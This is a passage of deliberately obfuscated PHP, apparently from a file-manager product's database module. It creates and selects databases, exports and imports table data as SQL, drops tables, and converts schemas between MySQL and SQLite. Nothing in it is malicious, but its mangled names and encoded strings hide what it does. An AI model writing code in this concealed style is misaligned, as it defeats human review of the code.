$ŞÅä“™Ç[$üöÜôÚ[1140]]; $ŞÅä“™Ç[$üöÜôÚ[1140]] = $üöÜôÚ[12]; if ($ŞÅä“™Ç[$üöÜôÚ[1135]] == $üöÜôÚ[1132]) { $›âÈ¿èã = $ŞÅä“™Ç[$üöÜôÚ[1141]]; $ŞÅä“™Ç[$üöÜôÚ[1141]] = substr($›âÈ¿èã, 0, strrpos($›âÈ¿èã, $üöÜôÚ[1229])); } $this->database = $ŞÅä“™Ç; $ìÄß®² = $this->model()->db(); $…ñİ©ã = $ìÄß®²->execute("\163\150\157\x77\x20\x64\x61\164\141\142\141\163\x65\163\40\154\x69\153\x65\x20\47{$†¥„İù¯}\x27"); if (!$…ñİ©ã) { try { $ìÄß®²->execute("\x63\162\145\x61\x74\145\40\x64\x61\164\x61\142\x61\163\x65\40\140{$†¥„İù¯}\x60"); } catch (Exception $»é§ãé) { $this->message = $»é§ãé->getMessage(); return !1; } } $ŞÅä“™Ç[$üöÜôÚ[1140]] = $†¥„İù¯; if ($ŞÅä“™Ç[$üöÜôÚ[1135]] == $üöÜôÚ[1132]) { $ŞÅä“™Ç[$üöÜôÚ[1141]] .= $üöÜôÚ[1229] . $†¥„İù¯; } $this->database = $ŞÅä“™Ç; try { $ìÄß®²->execute("\165\163\145\x20\140{$†¥„İù¯}\140"); } catch (Exception $»é§ãé) { $this->message = $»é§ãé->getMessage(); return !1; } return $ìÄß®²; } public function createTable($êË¾¦¸, &$ÃÑûğËª) { $Ôƒàä™Œ =& $_SERVER[ïÃ°£«Ê]; if (!IO::exist($êË¾¦¸)) { show_json(LNG($Ôƒàä™Œ[1230]), !1); } $øÙø‚ø = $this->model()->db(); $´ŠÎöˆ = IO::getContent($êË¾¦¸); $´ŠÎöˆ = str_ireplace($Ôƒàä™Œ[1231], $Ôƒàä™Œ[1232], $´ŠÎöˆ); $‘ï²Ô®º = sqlSplit($´ŠÎöˆ); foreach ($‘ï²Ô®º as $à¯—İ‚) { $µÄ÷Á¹Á = stripos($à¯—İ‚, $Ôƒàä™Œ[1233]) === 0; if ($µÄ÷Á¹Á) { $ÃÑûğËª->task[$Ôƒàä™Œ[1234]] += 1; } $øÙø‚ø->execute($à¯—İ‚); if ($µÄ÷Á¹Á) { preg_match($Ôƒàä™Œ[1235], $à¯—İ‚, $ÔèŠÂ§´); $ÃÑûğËª->task[$Ôƒàä™Œ[1236]] = $ÔèŠÂ§´[1]; $ÃÑûğËª->update(1); } } } public function insertTable($£‹ñ¿¾‚, &$©Û×øÄü) { $ö‚³ª‘¡ =& $_SERVER[ïÃ°£«Ê]; $÷Í‹ï¦Ô = $this->model()->db(); $Ö¿‹Íã = $ÏØı’÷È ? array($ÏØı’÷È) : $÷Í‹ï¦Ô->getTables(); foreach ($£‹ñ¿¾‚ as $×óã‚˜) { $ÏØı’÷È = basename($×óã‚˜, $ö‚³ª‘¡[892]); if (!in_array($ÏØı’÷È, $Ö¿‹Íã)) { continue; } $©Û×øÄü->task[$ö‚³ª‘¡[1236]] = $ÏØı’÷È; if ($ÏØı’÷È == $ö‚³ª‘¡[472]) { continue; } if (get_filesize($×óã‚˜) == 0) { continue; } $¶êõÇüû = $this->sqlToDb($×óã‚˜, $©Û×øÄü); if (!$¶êõÇüû) { show_json(LNG($ö‚³ª‘¡[1237]) . "\x5b{$ÏØı’÷È}\135", !1); } } } public function sqlFromDb($É¡ÁÎ‰œ, $şßà€Î, &$ê…Õ–ËÈ, $ÛŞÖ×±Ò = '') { $„¦íúƒ¹ =& $_SERVER[ïÃ°£«Ê]; if ($ê…Õ–ËÈ) { $ê…Õ–ËÈ->task[$„¦íúƒ¹[1236]] = $É¡ÁÎ‰œ; } $Ü­ÉúÉ = $this->model($É¡ÁÎ‰œ); $åÈÁˆ¼· = 0; $¤ûÑ´Î© = 0; $Ë´à›Õ¶ = 10000; $Ñ¦ïšê© = fopen($şßà€Î, $„¦íúƒ¹[1238]); $‹³Ÿ±ĞÂ = $Ü­ÉúÉ->getPk(); $ô”¦§Ç‚ = $Ü­ÉúÉ->getDbFields(); $±½’Ô˜ö = $„¦íúƒ¹[12]; if ($GLOBALS[$„¦íúƒ¹[891]] && in_array($É¡ÁÎ‰œ, array($„¦íúƒ¹[1239], $„¦íúƒ¹[1240]))) { $±½’Ô˜ö = $É¡ÁÎ‰œ; } do { $ıÔ•ç¥ô = array($‹³Ÿ±ĞÂ => array($„¦íúƒ¹[1182], $¤ûÑ´Î©)); $ûÙÚ½œ« = $Ü­ÉúÉ->where($ıÔ•ç¥ô)->field($ô”¦§Ç‚)->order($‹³Ÿ±ĞÂ . $„¦íúƒ¹[1241])->limit($Ë´à›Õ¶)->select(); $ûÙÚ½œ« = !empty($ûÙÚ½œ«) ? $ûÙÚ½œ« : array(); if (!($ß–ŠÍş® = count($ûÙÚ½œ«))) { break; } $Şİ×Á¾¬ = end($ûÙÚ½œ«); $¤ûÑ´Î© = $Şİ×Á¾¬[$‹³Ÿ±ĞÂ]; $€ÁÁ÷„å = array(); foreach ($ûÙÚ½œ« as $Õ†Ø›à) { if ($±½’Ô˜ö) { if ($É¡ÁÎ‰œ == $„¦íúƒ¹[1239]) { if ($Õ†Ø›à[$„¦íúƒ¹[33]] == $„¦íúƒ¹[1242]) { $½ºùƒËÔ = json_decode($Õ†Ø›à[$„¦íúƒ¹[451]], !0); if ($½ºùƒËÔ[$„¦íúƒ¹[32]] == $GLOBALS[$„¦íúƒ¹[891]] && $½ºùƒËÔ[$„¦íúƒ¹[851]] != 1) { continue; } } } else { if ($Õ†Ø›à[$„¦íúƒ¹[33]] == $„¦íúƒ¹[1243] && $Õ†Ø›à[$„¦íúƒ¹[95]] == $„¦íúƒ¹[887]) { continue; } } } $€ÁÁ÷„å[] = $„¦íúƒ¹[1244] . $this->sqlEncode($Õ†Ø›à) . $„¦íúƒ¹[1245]; } $İ”¢…‚Û = "\111\x4e\123\105\x52\124\40\111\116\124\x4f\x20\x60{$É¡ÁÎ‰œ}\140\x20\50\x60" . implode($„¦íúƒ¹[1246], $ô”¦§Ç‚) . $„¦íúƒ¹[1247]; fwrite($Ñ¦ïšê©, $İ”¢…‚Û . implode($„¦íúƒ¹[1248], $€ÁÁ÷„å) . $„¦íúƒ¹[74] . PHP_EOL); $åÈÁˆ¼· += $ß–ŠÍş®; if ($ê…Õ–ËÈ) { $ê…Õ–ËÈ->update($ß–ŠÍş®); } } while ($Ë´à›Õ¶ == $ß–ŠÍş®); fclose($Ñ¦ïšê©); return $åÈÁˆ¼·; } public function sqlToDb($İÍœŸ×ø, &$Ñí¤Ëƒ¯) { $–çï­æÌ =& $_SERVER[ïÃ°£«Ê]; $”¹ß ë¿ = $this->model()->db(); $á¦ê‘£Å = @fopen($İÍœŸ×ø, $–çï­æÌ[1249]); if (!$á¦ê‘£Å) { return !1; } $áØ€†¿ = 0; $å¡¸ë µ = $–çï­æÌ[12]; $‰Ú“®º™ = array(); $‡€Å²ƒÍ = $this->dbType(); $ÒÖ·°ü÷ = $‡€Å²ƒÍ == $–çï­æÌ[13] ? 500 : 2000; $±«œÎø = basename($İÍœŸ×ø, $–çï­æÌ[892]); $³Ó·Ñá = 0; $‘Ñî¯û = 4194304; while (!feof($á¦ê‘£Å)) { $§²à³¹¤ = trim(fgets($á¦ê‘£Å)); if (!$§²à³¹¤) { continue; } $ÙÃ†ŒÍ¾ = $this->sqlDecode($§²à³¹¤, $‡€Å²ƒÍ, $±«œÎø); if (stripos($ÙÃ†ŒÍ¾, $–çï­æÌ[430]) === 0) { if (!$å¡¸ë µ) { $å¡¸ë µ = $ÙÃ†ŒÍ¾ . $–çï­æÌ[53]; } continue; } if ($Ñí¤Ëƒ¯) { $Ñí¤Ëƒ¯->task[$–çï­æÌ[1234]] += 1; } $áØ€†¿++; $‰Ú“®º™[] = rtrim(rtrim(trim($ÙÃ†ŒÍ¾), $–çï­æÌ[50]), $–çï­æÌ[74]); $»íî¿£ê = null; $ÍÀß±¹ = strlen($ÙÃ†ŒÍ¾); $³Ó·Ñá += $ÍÀß±¹; $‹ÔÒ€¦° = strlen($å¡¸ë µ) + $³Ó·Ñá + (count($‰Ú“®º™) - 1); if ($‹ÔÒ€¦° >= $‘Ñî¯û) { $»íî¿£ê = array_pop($‰Ú“®º™); if ($áØ€†¿ > 1) { $áØ€†¿--; } } if ($áØ€†¿ >= $ÒÖ·°ü÷ || $»íî¿£ê) { $ÙÃ†ŒÍ¾ = $å¡¸ë µ . implode($–çï­æÌ[50], $‰Ú“®º™); if (!$”¹ß ë¿->execute($ÙÃ†ŒÍ¾)) { return !1; } if ($Ñí¤Ëƒ¯) { $Ñí¤Ëƒ¯->update($áØ€†¿); } $‰Ú“®º™ = array(); $áØ€†¿ = 0; $³Ó·Ñá = 0; if ($»íî¿£ê) { $‰Ú“®º™ = array($»íî¿£ê); $áØ€†¿ = 1; $³Ó·Ñá = $ÍÀß±¹; } } } fclose($á¦ê‘£Å); if (!empty($‰Ú“®º™)) { $ÙÃ†ŒÍ¾ = $å¡¸ë µ . implode($–çï­æÌ[50], $‰Ú“®º™); if (!$”¹ß ë¿->execute($ÙÃ†ŒÍ¾)) { return !1; } if ($Ñí¤Ëƒ¯) { $Ñí¤Ëƒ¯->update($áØ€†¿); } } return !0; } public function dropTable($¹—„ÍÅà = null) { $»êŞ«òò =& $_SERVER[ïÃ°£«Ê]; $ì·´ÛË = $this->model()->db(); $‚ÃÜµ„Ã = $¹—„ÍÅà ? array($¹—„ÍÅà) : $ì·´ÛË->getTables(); if (!$‚ÃÜµ„Ã) { return; } foreach ($‚ÃÜµ„Ã as $¹—„ÍÅà) { if ($¹—„ÍÅà) { $¹—„ÍÅà = strtolower($¹—„ÍÅà); } else { continue; } $ì·´ÛË->execute($»êŞ«òò[1250] . $this->escapeName($¹—„ÍÅà) . $»êŞ«òò[1251]); } } private function sqlEncode($«ÄÒöË) { $—üë•†ğ =& $_SERVER[ïÃ°£«Ê]; $†ŸŠöÔ = array(); foreach ($«ÄÒöË as $«Ø¾‘ÊÂ) { if (is_array($«Ø¾‘ÊÂ)) { $«Ø¾‘ÊÂ = json_encode_force($«Ø¾‘ÊÂ); } $«Ø¾‘ÊÂ = addslashes($«Ø¾‘ÊÂ); $«Ø¾‘ÊÂ = str_replace(array($—üë•†ğ[1252], $—üë•†ğ[285], $—üë•†ğ[417]), array($—üë•†ğ[1253], $—üë•†ğ[1254], $—üë•†ğ[1255]), $«Ø¾‘ÊÂ); $†ŸŠöÔ[] = $«Ø¾‘ÊÂ; } return $—üë•†ğ[58] . implode($—üë•†ğ[1256], $†ŸŠöÔ) . $—üë•†ğ[58]; } private function sqlDecode($‡ÃÁ‚Ú, $ãûš’öá, $¡£•úáÙ = '') { $ŠÄ™è¾ =& $_SERVER[ïÃ°£«Ê]; $‡ÃÁ‚Ú = str_replace(array($ŠÄ™è¾[1253], $ŠÄ™è¾[1254], $ŠÄ™è¾[1255]), array($ŠÄ™è¾[1252], $ŠÄ™è¾[285], $ŠÄ™è¾[417]), $‡ÃÁ‚Ú); if ($ãûš’öá == $ŠÄ™è¾[13]) { $‡ÃÁ‚Ú = str_ireplace($ŠÄ™è¾[1257], $ŠÄ™è¾[59], $‡ÃÁ‚Ú); $‡ÃÁ‚Ú = stripslashes($‡ÃÁ‚Ú); } return preg_replace($ŠÄ™è¾[1258], $ŠÄ™è¾[12], $‡ÃÁ‚Ú); if ($ãûš’öá == $ŠÄ™è¾[13]) { return $¡£•úáÙ != $ŠÄ™è¾[472] ? stripslashes($‡ÃÁ‚Ú) : $‡ÃÁ‚Ú; } if ($¡£•úáÙ == $ŠÄ™è¾[472]) { $‡ÃÁ‚Ú = str_replace($ŠÄ™è¾[1259], $ŠÄ™è¾[118], stripslashes($‡ÃÁ‚Ú)); } return $‡ÃÁ‚Ú; } public function getSqlFile($÷¿«éìº = '') { $¥¨ê¥àˆ =& $_SERVER[ïÃ°£«Ê]; $éÂ©•õĞ = $this->dbType(!0); $º†öÍÏÒ = CONTROLLER_DIR . "\151\156\163\164\x61\154\154\57\x64\x61\x74\141\57{$éÂ©•õĞ}\x2e\163\161\x6c"; if (!file_exists($º†öÍÏÒ)) { return !1; } $²µ‹±¶“ = file_get_contents($º†öÍÏÒ); $‰œªì”« = $¥¨ê¥àˆ[1260] . ($éÂ©•õĞ == $¥¨ê¥àˆ[902] ? $¥¨ê¥àˆ[1261] : $¥¨ê¥àˆ[1262]) . $¥¨ê¥àˆ[1263]; preg_match_all($‰œªì”«, $²µ‹±¶“, $§ğ–½Å); $Åæï¯õ = $§ğ–½Å[1]; $×ã–Í­ = $this->model()->db(); $ÓÍŞÔÚ‰ = $×ã–Í­->getTables(); $Òƒ…ì’ê = TEMP_FILES . $¥¨ê¥àˆ[1264] . date($¥¨ê¥àˆ[259]) . $¥¨ê¥àˆ[8]; del_dir($Òƒ…ì’ê); mk_dir($Òƒ…ì’ê); $ÅÅòêõà = $Òƒ…ì’ê . $¥¨ê¥àˆ[1265]; $­ìçşáŒ = $Òƒ…ì’ê . $¥¨ê¥àˆ[1266]; $ÌÉØ—Ü„ = $éÂ©•õĞ == $¥¨ê¥àˆ[13] ? $¥¨ê¥àˆ[902] : $¥¨ê¥àˆ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\x61\x6c\x6c\x2f\x64\141\x74\141\x2f{$ÌÉØ—Ü„}\x2e\x73\x71\x6c", $Òƒ…ì’ê); @touch($Òƒ…ì’ê . $éÂ©•õĞ . $¥¨ê¥àˆ[892]); $øïıïÖ = fopen($ÅÅòêõà, $¥¨ê¥àˆ[1238]); $™Ñ—ˆ¶¯ = fopen($­ìçşáŒ, $¥¨ê¥àˆ[1238]); if ($éÂ©•õĞ == $¥¨ê¥àˆ[13]) { $ÓÍŞÔÚ‰ = array_diff($ÓÍŞÔÚ‰, array($¥¨ê¥àˆ[885], $¥¨ê¥àˆ[886])); $§›ª€‰Õ = array($¥¨ê¥àˆ[1267], $¥¨ê¥àˆ[1268], $¥¨ê¥àˆ[1269]); fwrite($™Ñ—ˆ¶¯, implode(PHP_EOL, $§›ª€‰Õ) . PHP_EOL . PHP_EOL); foreach ($ÓÍŞÔÚ‰ as $Ò˜Ÿ´ß¤) { $ÏÛóÂ¹º = $this->sqlFromSqlite($Ò˜Ÿ´ß¤); if (!$ÏÛóÂ¹º[$¥¨ê¥àˆ[13]]) { continue; } fwrite($™Ñ—ˆ¶¯, $ÏÛóÂ¹º[$¥¨ê¥àˆ[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ò˜Ÿ´ß¤, $Åæï¯õ)) { fwrite($øïıïÖ, $ÏÛóÂ¹º[$¥¨ê¥àˆ[902]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÓÍŞÔÚ‰ as $Ò˜Ÿ´ß¤) { $ÏÛóÂ¹º = $this->sqlFromMysql($Ò˜Ÿ´ß¤); if (!$ÏÛóÂ¹º[$¥¨ê¥àˆ[902]]) { continue; } fwrite($øïıïÖ, $ÏÛóÂ¹º[$¥¨ê¥àˆ[902]] . PHP_EOL . PHP_EOL); if (!in_array($Ò˜Ÿ´ß¤, $Åæï¯õ)) { fwrite($™Ñ—ˆ¶¯, $ÏÛóÂ¹º[$¥¨ê¥àˆ[13]] . PHP_EOL . PHP_EOL); } } } fclose($øïıïÖ); fclose($™Ñ—ˆ¶¯); $²µ‹±¶“ = array($¥¨ê¥àˆ[902] => $ÅÅòêõà, $¥¨ê¥àˆ[13] => $­ìçşáŒ); return $÷¿«éìº ? $²µ‹±¶“[$÷¿«éìº] : $²µ‹±¶“; } public function dbType($™ã¯Ë¿› = false) { $î…Ğ¢Ë =& $_SERVER[ïÃ°£«Ê]; $Å…¹Ëß° = $™ã¯Ë¿› ? $GLOBALS[$î…Ğ¢Ë[6]][$î…Ğ¢Ë[21]] : $this->database; $Å…¹Ëß° = array_change_key_case($Å…¹Ëß°); $ıœ‰•Ò¦ = $Å…¹Ëß°[$î…Ğ¢Ë[1135]]; if ($ıœ‰•Ò¦ == $î…Ğ¢Ë[1132]) { $Ú¾¬î¨Ñ = explode($î…Ğ¢Ë[4], $Å…¹Ëß°[$î…Ğ¢Ë[1141]]); $ıœ‰•Ò¦ = $Ú¾¬î¨Ñ[0]; } $“¼­ƒ€İ = array($î…Ğ¢Ë[1270] => $î…Ğ¢Ë[13], $î…Ğ¢Ë[1077] => $î…Ğ¢Ë[902]); if (isset($“¼­ƒ€İ[$ıœ‰•Ò¦])) { $ıœ‰•Ò¦ = $“¼­ƒ€İ[$ıœ‰•Ò¦]; } return $ıœ‰•Ò¦; } public function sqlFromMysql($ºÑ°ÜØ, $ïóì®Ÿó = '') { $€ëÖÉ§® =& $_SERVER[ïÃ°£«Ê]; $ê¡·Ï™ı = array($€ëÖÉ§®[902] => $€ëÖÉ§®[12], $€ëÖÉ§®[13] => $€ëÖÉ§®[12]); $œšøÛÍ¨ = $this->escapeName($ºÑ°ÜØ); $³ÙŸê´— = $this->escapeName($ºÑ°ÜØ, $€ëÖÉ§®[13]); $ğ’ÄáşÌ = $this->model()->db(); $êñÒ¼– = $ğ’ÄáşÌ->query("\x73\150\x6f\167\40\x63\162\x65\x61\164\x65\x20\x74\x61\x62\154\x65\40{$œšøÛÍ¨}\x3b"); if (!$êñÒ¼– || !$êñÒ¼–[0]) { return !1; } $şĞù¯¢Â = _get($êñÒ¼–[0], $€ëÖÉ§®[1271], $€ëÖÉ§®[12]); if (!$şĞù¯¢Â) { return !1; } $© Ù‹Ïğ = "\x44\x52\117\x50\x20\124\101\102\x4c\x45\40\x49\106\x20\x45\x58\x49\123\x54\123\40{$œšøÛÍ¨}\73" . PHP_EOL . $şĞù¯¢Â . $€ëÖÉ§®[74]; if ($ïóì®Ÿó == $€ëÖÉ§®[902]) { return $© Ù‹Ïğ; } $ê¡·Ï™ı[$€ëÖÉ§®[902]] = $© Ù‹Ïğ; $œî¼Ã”º = array_change_key_case($GLOBALS[$€ëÖÉ§®[6]][$€ëÖÉ§®[21]]); $ÜÇŒëÎö = $œî¼Ã”º[$€ëÖÉ§®[1140]]; $Öë«…ßˆ = $€ëÖÉ§®[1272] . $ÜÇŒëÎö . "\47\40\x41\116\x44\x20\124\101\x42\x4c\x45\x5f\x4e\101\x4d\x45\40\x3d\x20{$³ÙŸê´—}\73"; $ğ„‘ıÇ = "\x53\x48\117\127\x20\111\x4e\104\105\130\x20\x46\122\x4f\115\40{$œšøÛÍ¨}\73"; $ú¥á”á = $ğ’ÄáşÌ->query($Öë«…ßˆ); if (empty($ú¥á”á)) { return $ïóì®Ÿó ? $ê¡·Ï™ı[$ïóì®Ÿó] : $ê¡·Ï™ı; } $Ÿôø¸Ò× = $ğ’ÄáşÌ->query($ğ„‘ıÇ); $¤åÕÅª¡ = $€ëÖÉ§®[12]; $ú­Í÷îø = array(); foreach ($Ÿôø¸Ò× as $íè›É¾·) { if (!$¤åÕÅª¡ && $íè›É¾·[$€ëÖÉ§®[1273]] == $€ëÖÉ§®[1274]) { $¤åÕÅª¡ = $íè›É¾·[$€ëÖÉ§®[1275]]; } if (isset($ú­Í÷îø[$íè›É¾·[$€ëÖÉ§®[1273]]])) { $ú­Í÷îø[$íè›É¾·[$€ëÖÉ§®[1273]]][$€ëÖÉ§®[1276]][] = $íè›É¾·[$€ëÖÉ§®[1275]]; continue; } $ú­Í÷îø[$íè›É¾·[$€ëÖÉ§®[1273]]] = array($€ëÖÉ§®[1277] => $íè›É¾·[$€ëÖÉ§®[1273]], $€ëÖÉ§®[1276] => array($íè›É¾·[$€ëÖÉ§®[1275]]), $€ëÖÉ§®[1278] => $íè›É¾·[$€ëÖÉ§®[1279]] == $€ëÖÉ§®[91] ? 0 : 1); } $çª•íí¶ = array(); foreach ($ú­Í÷îø as $íè›É¾·) { $»é¦ı¡õ = $íè›É¾·[$€ëÖÉ§®[1277]] == $€ëÖÉ§®[1274]; $åñÏ£Çº = $íè›É¾·[$€ëÖÉ§®[1278]] == $€ëÖÉ§®[91] && !$»é¦ı¡õ ? $€ëÖÉ§®[1280] : $€ëÖÉ§®[12]; $¡¥ÀìÔË = $€ëÖÉ§®[1281] . $ºÑ°ÜØ . $€ëÖÉ§®[11] . ($»é¦ı¡õ ? $€ëÖÉ§®[1282] : $íè›É¾·[$€ëÖÉ§®[1277]]); $ğ¤Ğ•æ¾ = $€ëÖÉ§®[1283] . implode($€ëÖÉ§®[1284], $íè›É¾·[$€ëÖÉ§®[1276]]) . $€ëÖÉ§®[1285]; $çª•íí¶[] = sprintf($€ëÖÉ§®[1286], $€ëÖÉ§®[1287], $åñÏ£Çº, $€ëÖÉ§®[1288], $¡¥ÀìÔË, $€ëÖÉ§®[1289], $ºÑ°ÜØ, $ğ¤Ğ•æ¾); } $ôÀŒüòå = array(); $Á®”á‡à = array($€ëÖÉ§®[1290] => $€ëÖÉ§®[390], $€ëÖÉ§®[1291] => $€ëÖÉ§®[390], $€ëÖÉ§®[364] => $€ëÖÉ§®[390], $€ëÖÉ§®[363] => $€ëÖÉ§®[390], $€ëÖÉ§®[1292] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1294] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1293] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1295] => $€ëÖÉ§®[1293], $€ëÖÉ§®[282] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1296] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1297] => $€ëÖÉ§®[1293], $€ëÖÉ§®[1298] => $€ëÖÉ§®[1299], $€ëÖÉ§®[365] => $€ëÖÉ§®[1299], $€ëÖÉ§®[366] => $€ëÖÉ§®[1299], $€ëÖÉ§®[1300] => $€ëÖÉ§®[1300]); foreach ($ú¥á”á as $íè›É¾·) { $ïóì®Ÿó = _get($Á®”á‡à, $íè›É¾·[$€ëÖÉ§®[1301]], $íè›É¾·[$€ëÖÉ§®[1302]]); $øª„ê¡ = $íè›É¾·[$€ëÖÉ§®[1303]] == $€ëÖÉ§®[1060] ? $€ëÖÉ§®[1304] : $€ëÖÉ§®[1305]; $íáÊÇ¿ = $íè›É¾·[$€ëÖÉ§®[1306]] == $¤åÕÅª¡ ? $€ëÖÉ§®[1307] : $€ëÖÉ§®[12]; $ööğÀ‹õ = $íè›É¾·[$€ëÖÉ§®[1114]] ? strtoupper(str_replace($€ëÖÉ§®[11], $€ëÖÉ§®[12], $íè›É¾·[$€ëÖÉ§®[1114]])) : $€ëÖÉ§®[12]; $ôÀŒüòå[] = sprintf($€ëÖÉ§®[1308], $íè›É¾·[$€ëÖÉ§®[1306]], $ïóì®Ÿó, $øª„ê¡, $íáÊÇ¿, $ööğÀ‹õ); } $úû’èĞË = array("\x44\x52\x4f\x50\40\x54\x41\x42\114\x45\40\111\x46\x20\x45\130\111\123\124\123\x20{$³ÙŸê´—}\x3b", "\103\x52\105\x41\124\x45\x20\x54\x41\102\114\105\x20{$³ÙŸê´—}\x20\50", implode($€ëÖÉ§®[50] . PHP_EOL, $ôÀŒüòå), $€ëÖÉ§®[1309]); $Ì‹Ú°“Ï = implode(PHP_EOL, array_merge($úû’èĞË, $çª•íí¶)); if ($ïóì®Ÿó == $€ëÖÉ§®[13]) { return $Ì‹Ú°“Ï; } $ê¡·Ï™ı[$€ëÖÉ§®[13]] = $Ì‹Ú°“Ï; return $ê¡·Ï™ı; } public function sqlFromSqlite($¼‘Ò¤ªµ, $‰²‚¿¿Õ = '') { $Ï÷ÑÌë =& $_SERVER[ïÃ°£«Ê]; $Œá»ËÉ¶ = array($Ï÷ÑÌë[902] => $Ï÷ÑÌë[12], $Ï÷ÑÌë[13] => $Ï÷ÑÌë[12]); $­•œÕ™Ô = $this->escapeName($¼‘Ò¤ªµ); $–É’Å„– = $this->escapeName($¼‘Ò¤ªµ, $Ï÷ÑÌë[13]); $é¯µÜÚÑ = $this->model()->db(); $ª ç¶”‹ = "\120\x52\x41\x47\115\101\x20\x54\x41\x42\x4c\x45\x5f\111\116\106\117\40\50\x27{$¼‘Ò¤ªµ}\47\51"; $«­òñ—  = "\x53\105\114\x45\x43\x54\40\52\40\x46\x52\117\115\40\x73\161\154\x69\x74\145\137\x6d\141\163\164\x65\x72\40\127\110\x45\x52\105\40\x74\142\x6c\x5f\156\141\x6d\145\x20\75\40\x27{$¼‘Ò¤ªµ}\47"; $êş°ˆŒÚ = $é¯µÜÚÑ->query($ª ç¶”‹); if (empty($êş°ˆŒÚ)) { return $‰²‚¿¿Õ ? $Œá»ËÉ¶[$‰²‚¿¿Õ] : $Œá»ËÉ¶; } $ı†çÛ©­ = $é¯µÜÚÑ->query($«­òñ— ); $óÖ— …´ = $Âåš´„¬ = array(); foreach ($ı†çÛ©­ as $ğÇè†÷°) { if ($ğÇè†÷°[$Ï÷ÑÌë[33]] == $Ï÷ÑÌë[357]) { $óÖ— …´[] = $ğÇè†÷°[$Ï÷ÑÌë[1310]]; } else { $Âåš´„¬[] = $ğÇè†÷°[$Ï÷ÑÌë[1310]]; } } $ö‹²ÏÏà = array_merge(array("\104\122\117\120\40\x54\101\x42\114\x45\40\111\106\40\x45\130\x49\123\x54\123\x20{$–É’Å„–}\x3b"), $óÖ— …´, $Âåš´„¬); $ö‹²ÏÏà = implode($Ï÷ÑÌë[74] . PHP_EOL, $ö‹²ÏÏà) . $Ï÷ÑÌë[74]; if ($‰²‚¿¿Õ == $Ï÷ÑÌë[13]) { return $ö‹²ÏÏà; } $Œá»ËÉ¶[$Ï÷ÑÌë[13]] = $ö‹²ÏÏà; $úáİ”Öò = $ÆË¿“ê¡ = array(); $£Ü™–¨ = array(); $™ÙÉşÕà = array(); foreach ($ı†çÛ©­ as $ğÇè†÷°) { if ($ğÇè†÷°[$Ï÷ÑÌë[33]] == $Ï÷ÑÌë[1311]) { $€”æ–úû = $ğÇè†÷°[$Ï÷ÑÌë[1310]]; $†ßûş´ò = stripos($€”æ–úû, $Ï÷ÑÌë[1280]) !== !1; $Àªâ“ = stripos($€”æ–úû, $Ï÷ÑÌë[1274]) !== !1; preg_match($Ï÷ÑÌë[1312], $€”æ–úû, $ÙÒ¦Ì¬œ); if (empty($ÙÒ¦Ì¬œ)) { continue; } $¿’¶×‡â = array_map($Ï÷ÑÌë[1313], explode($Ï÷ÑÌë[50], $ÙÒ¦Ì¬œ[1])); $·®øïıÌ = array(); foreach ($¿’¶×‡â as $œæÓæËš) { $ââÒ¬°¾ = trim($œæÓæËš, $Ï÷ÑÌë[1314]); $·®øïıÌ[] = $ââÒ¬°¾; $£Ü™–¨[$ââÒ¬°¾] = !0; } $™ÙÉşÕà[] = array($Ï÷ÑÌë[32] => $ğÇè†÷°[$Ï÷ÑÌë[32]], $Ï÷ÑÌë[1310] => $€”æ–úû, $Ï÷ÑÌë[1315] => $†ßûş´ò, $Ï÷ÑÌë[1316] => $Àªâ“, $Ï÷ÑÌë[1317] => $·®øïıÌ); } } $”½Š’Ó = array($Ï÷ÑÌë[1291] => $Ï÷ÑÌë[1291], $Ï÷ÑÌë[390] => $Ï÷ÑÌë[1318], $Ï÷ÑÌë[1299] => $Ï÷ÑÌë[1319], $Ï÷ÑÌë[1293] => $Ï÷ÑÌë[1293], $Ï÷ÑÌë[1300] => $Ï÷ÑÌë[1320], $Ï÷ÑÌë[1321] => $Ï÷ÑÌë[1322]); $†îúÒ·Ç = array($Ï÷ÑÌë[451], $Ï÷ÑÌë[168], $Ï÷ÑÌë[540]); $ûøç·ú¢ = array($Ï÷ÑÌë[390], $Ï÷ÑÌë[1299], $Ï÷ÑÌë[1321], $Ï÷ÑÌë[1291]); foreach ($êş°ˆŒÚ as $ğÇè†÷°) { $À¢˜¶‡ = $ğÇè†÷°[$Ï÷ÑÌë[32]]; $¢ã¶¯ŞØ = strtolower($ğÇè†÷°[$Ï÷ÑÌë[33]]); if ($¢ã¶¯ŞØ == $Ï÷ÑÌë[1293] && isset($£Ü™–¨[$À¢˜¶‡])) { $‰²‚¿¿Õ = in_array($À¢˜¶‡, $†îúÒ·Ç) ? $Ï÷ÑÌë[1293] : $Ï÷ÑÌë[1323]; } else { $‰²‚¿¿Õ = _get($”½Š’Ó, $¢ã¶¯ŞØ, $¢ã¶¯ŞØ); } if ($ğÇè†÷°[$Ï÷ÑÌë[57]] > 0) { $ÆË¿“ê¡[$ğÇè†÷°[$Ï÷ÑÌë[57]]] = $À¢˜¶‡; } $ÒƒÆåŸ = $Ï÷ÑÌë[12]; if ($ğÇè†÷°[$Ï÷ÑÌë[56]] !== null) { $ï£®…°¦ = $ğÇè†÷°[$Ï÷ÑÌë[56]]; if (in_array($¢ã¶¯ŞØ, $ûøç·ú¢) && is_numeric($ï£®…°¦)) { $ÒƒÆåŸ = "\104\105\x46\101\x55\114\x54\40{$ï£®…°¦}"; } else { if (strtolower($ï£®…°¦) === $Ï÷ÑÌë[103]) { $ÒƒÆåŸ = $ğÇè†÷°[$Ï÷ÑÌë[35]] ? $Ï÷ÑÌë[12] : $Ï÷ÑÌë[1305]; } else { $°´ä®°¿ = is_numeric($ï£®…°¦) ? $ï£®…°¦ : $Ï÷ÑÌë[58] . addslashes($ï£®…°¦) . $Ï÷ÑÌë[58]; $ÒƒÆåŸ = "\x44\105\106\x41\125\x4c\x54\x20{$°´ä®°¿}"; } } } $Á…ÊÚ©Ä = $ğÇè†÷°[$Ï÷ÑÌë[35]] ? $Ï÷ÑÌë[1304] : $Ï÷ÑÌë[1324]; $ÓÀìıçì = stripos($¢ã¶¯ŞØ, $Ï÷ÑÌë[364]) !== !1 && $ğÇè†÷°[$Ï÷ÑÌë[57]] ? $Ï÷ÑÌë[1325] : $Ï÷ÑÌë[12]; $úáİ”Öò[] = sprintf($Ï÷ÑÌë[1326], $À¢˜¶‡, 